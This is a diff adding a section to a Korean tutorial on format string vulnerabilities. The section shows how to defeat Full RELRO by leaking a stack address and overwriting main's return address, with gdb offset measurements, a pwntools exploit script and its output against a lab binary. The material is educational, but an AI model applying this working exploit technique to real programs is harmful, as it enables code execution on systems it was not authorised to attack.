@@ -273,6 +273,56 @@ checksec --file=./fmt_relro     # RELRO: Full RELRO
 
 핵심은 두 가지다. 포맷 스트링은 **읽기와 쓰기를 한 취약점에서** 주기 때문에 ASLR을 스스로 무력화하고, 그래서 "읽기만 된다"는 보고를 가볍게 보면 안 된다.
 
+### 7.1 한 사례의 실제 우회 과정: Full RELRO에서 GOT 대신 무엇을 덮는가
+
+4.2의 `got_overwrite.py`는 Full RELRO 빌드에서 SIGSEGV로 끝났다. 쓰기 프리미티브는 그대로인데 **표적**이 읽기 전용이 된 것이다. 공격자는 표적을 바꾼다.
+
+| 후보 표적 | 상태 (glibc 2.39, Ubuntu 24.04) | 필요한 것 |
+|---|---|---|
+| `__malloc_hook`, `__free_hook` | glibc 2.34에서 **제거**. `nm -D libc.so.6`에 `__malloc_hook@GLIBC_2.2.5` 호환 심볼이 아직 보이지만 `malloc`이 더는 읽지 않는 빈 변수다. 덮어도 아무 일도 없다 | 쓸 수 없음 |
+| `exit` 핸들러 (`__exit_funcs`의 `atexit` 항목) | 존재. 단 함수 포인터가 **포인터 맹글링**(`PTR_MANGLE`: 스레드별 비밀 값과 XOR 후 회전)되어 있어 비밀 값(`fs:0x30`)을 먼저 읽어야 한다 | libc 주소 + 비밀 값 누출, 쓰기 2회 이상 |
+| `stdout`의 `_IO_FILE` vtable 포인터 | 존재. 2.24부터 vtable이 `__libc_IO_vtables` 구역 안인지 검사하므로 구역 안의 다른 vtable(`_IO_wfile_jumps` 등)로 바꿔 우회하는 기법이 버전마다 바뀐다 | libc 주소 누출, 버전별 기법 |
+| **스택의 반환 주소** | 항상 존재. 맹글링·검사 없음. 카나리와 무관(순차 덮어쓰기가 아니라 `%n`으로 그 자리만 쓴다) | **스택 주소 누출** 한 번 |
+
+가장 단순한 것이 마지막 줄이다. 포맷 스트링은 스택 주소도 같이 누출하므로 **같은 취약점 하나로** 끝난다. 4절의 `fmt.c`에서 입력을 두 번 받도록 바꾼 `fmt2.c`(`for (i = 0; i < 2; i++) { fgets(buf, ...); printf(buf); }`, 마지막은 `return 0`)를 Full RELRO로 빌드한다.
+
+```bash
+gcc -g -O0 -no-pie -Wl,-z,relro,-z,now -o fmt2 fmt2.c
+checksec --file=./fmt2          # RELRO: Full RELRO / PIE: No PIE
+```
+
+**1단계: 스택 주소를 하나 누출하고, 반환 주소 자리까지의 거리를 gdb로 잰다.** `%N$p`를 훑으면 `0x7ff...`로 시작하는 값이 여러 개 나온다. 그중 하나를 고르고, gdb에서 그 값과 `main`의 반환 주소 자리(`$rbp+8`)의 차이를 구한다. 이 차이는 프레임 구조가 정하므로 ASLR과 무관하게 **고정**이다.
+
+```
+$ printf 'AAAAAAAA%%8$p\n' | ./fmt2 | head -1
+AAAAAAAA0x4141414141414141            ← 입력 버퍼는 8번째 인자 (fmt.c와 달리 지역 변수 i가 앞에 있다)
+(gdb) break 13
+(gdb) run < in2.txt
+(gdb) p $rbp
+$3 = (void *) 0x7fffffffc610
+(gdb) x/gx $rbp+8                     ← main의 반환 주소 자리
+0x7fffffffc618: 0x00007ffff7c2a1ca    ← __libc_start_call_main+122
+(gdb) x/gx $rsp+(12-6)*8              ← 12번째 인자가 읽는 스택 슬롯
+0x7fffffffc520: 0x00007fffffffc620    ← = rbp+0x10. 따라서 반환 주소 자리 = (%12$p) - 8
+```
+
+**2단계: 첫 입력으로 누출, 두 번째 입력으로 반환 주소에 `win`을 쓴다.** `fmtstr_payload`가 바이트 단위 `%hhn` 분할을 만든다. 4.2와 다른 것은 사전의 키뿐이다.
+
+```python
+p.sendline(b'%12$p')                                   # 1라운드: 스택 주소 누출
+ret_slot = int(p.recvline().strip(), 16) - 8           # gdb로 잰 고정 거리
+payload = fmtstr_payload(8, {ret_slot: elf.symbols['win']})   # 2라운드: 반환 주소에 쓰기. 64바이트
+p.sendline(payload)
+```
+
+```
+$ python3 fmt2_x.py
+leak=0x7ffccb83b7a0 ret_slot=0x7ffccb83b798 win=0x4011d6
+b'... [+] win() reached\n'
+```
+
+`main`이 `return 0`으로 돌아가는 순간 `ret`이 `win`으로 점프한다. 대조군으로 같은 바이너리에 GOT(`elf.got['printf']`)를 쓰면 SIGSEGV(종료 코드 -11)로 끝난다(실측). **읽을 것**: (1) Full RELRO는 "쓰기 표적 하나"를 없앴을 뿐이고, 포맷 스트링처럼 누출을 함께 주는 취약점 앞에서는 한 라운드를 더 요구하는 데 그친다. (2) 입력을 한 번만 받는 프로그램(원래 `fmt.c`)에서는 누출과 쓰기를 한 페이로드에 넣을 수 없으므로 스택 주소를 모른 채 써야 하고, 그때는 스택에 이미 있는 포인터 사슬(`rbp` 체인)을 1차 `%n`으로 조작하는 표의 마지막 행 기법이 필요하다. (3) `exit(1)`로 끝나는 원래 `fmt.c`는 `main`의 반환 주소를 쓰지 않으므로 `printf` 자신의 반환 주소(`printf` 실행 중에도 스택에 있다)가 표적이 된다. 표적을 고르는 기준은 언제나 "쓴 뒤에 **실제로 읽히는** 함수 포인터인가"다.
+
 ## 8. 실제 CVE 사례
 
 | CVE | 제품 | 핵심 | 패치 |
@@ -323,3 +373,4 @@ checksec --file=./fmt_relro     # RELRO: Full RELRO
 | 2026-10-22 | 본문 작성. 실습 출력과 pwntools 스크립트는 Ubuntu 24.04 / gcc 13.3 / glibc 2.39에서 실측 | @anthonynoh5202 |
 | 2026-10-22 | 기술 검증: CVE 4건 cvelistV5 대조(모두 실존), sudo·MSVR·VMSA·libinput 링크를 레코드 URL로 교체, libinput 영향 버전 정정. `read_rodata.py`·`got_overwrite.py`를 Partial/Full RELRO 빌드에서 재실행(Full RELRO는 SIGSEGV 확인). 경고 줄 번호 정정, `.fini_array`가 Partial RELRO에서도 읽기 전용임을 명시, FORTIFY의 `%N$n` 메시지 추가 | 검증팀 |
 | 2026-10-22 | 독자 테스트 반영: 3.1절 "Ubuntu gcc는 -Werror=format-security 기본"을 실측(기본은 -Wformat-security 경고, -Werror는 dpkg-buildflags)으로 정정. 장 참조 표기 정리 | @anthonynoh5202 |
+| 2026-10-22 | 독자 테스트 반영: 7절에 7.1 "Full RELRO에서 GOT 대신 무엇을 덮는가" 추가. 표적 후보표(`__malloc_hook` 류의 2.34 제거를 `nm -D` 호환 심볼과 함께 명시), fmt2.c를 Full RELRO로 빌드해 스택 누출→반환 주소 쓰기 흐름과 GOT 쓰기 대조군(SIGSEGV)을 실측 | @anthonynoh5202 |
